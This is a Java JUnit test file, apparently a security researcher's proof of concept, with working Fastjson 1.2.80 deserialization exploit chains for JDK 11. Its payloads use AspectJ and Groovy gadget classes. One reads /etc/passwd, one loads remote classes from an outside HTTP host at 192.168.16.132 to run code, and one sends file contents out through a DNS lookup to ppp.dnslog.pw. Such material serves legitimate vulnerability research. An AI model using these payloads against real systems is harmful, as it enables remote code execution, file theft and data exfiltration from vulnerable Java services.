package com.example.fastjson_1_2_80_jdk11;

import com.alibaba.fastjson.JSON;
import org.junit.jupiter.api.Test;

/**
 * @author Whoopsunix
 */

public class fastjson_1_2_80_jdk11 {

    // 三步打模拟，web项目可利用
    @Test
    public void aspectj() {
        String payload1 = "{\n" +
                "    \"@type\":\"java.lang.Exception\",\n" +
                "    \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\"\n" +
                "}";
        String payload2 = "{\n" +
                "    \"@type\":\"java.lang.Class\",\n" +
                "    \"val\":{\n" +
                "        \"@type\":\"java.lang.String\"{\n" +
                "        \"@type\":\"java.util.Locale\",\n" +
                "        \"val\":{\n" +
                "            \"@type\":\"com.alibaba.fastjson.JSONObject\",{\n" +
                "                \"@type\":\"java.lang.String\"\n" +
                "                \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\",\n" +
                "                \"newAnnotationProcessorUnits\":[{}]\n" +
                "            }\n" +
                "        }\n" +
                "    }";

        String payload3 = "{\n" +
                "    \"x\":{\n" +
                "        \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\n" +
                "        \"@type\":\"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\n" +
                "        \"fileName\":\"/etc/passwd\"\n" +
                "    }\n" +
                "}";
        JSON.parseObject(payload1);
        try {
            JSON.parseObject(payload2);
        } catch (Exception e) {
        }
        System.out.println(JSON.parseObject(payload3));
    }

    @Test
    public void groovy(){
        String payload1 = "{\n" +
                "    \"@type\":\"java.lang.Exception\",\n" +
                "    \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
                "    \"unit\":{}\n" +
                "}";
        String payload2 = "{\n" +
                "    \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
                "    \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
                "    \"config\":{\n" +
                "        \"@type\":\"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
                "        \"classpathList\":\"http://192.168.16.132:1234/\"\n" +
                "    }\n" +
                "}";

        try {
            JSON.parse(payload1);
        } catch (Exception e) {
        }
        JSON.parse(payload2);
    }

    @Test
    public void groovy2(){
        String payload = "{\"a\":{\"@type\":\"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\n" +
                "\"fileName\":\"/etc/passwd\"},\"b\":\n" +
                "{\"@type\":\"java.net.Inet4Address\",\"val\":{\"@type\":\"java.lang.String\"{\"@type\":\"java.util.Locale\", \"val\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",{\"@type\": \"java.lang.String\"\"@type\":\"java.util.Locale\", \"language\":{\"@type\":\"java.lang.String\"{\"$ref\":\"$\"},\"country\":\"ppp.dnslog.pw\"}}}}}";
        Object jsonObject = JSON.parseObject(payload);
        System.out.println(jsonObject.toString());
    }
}
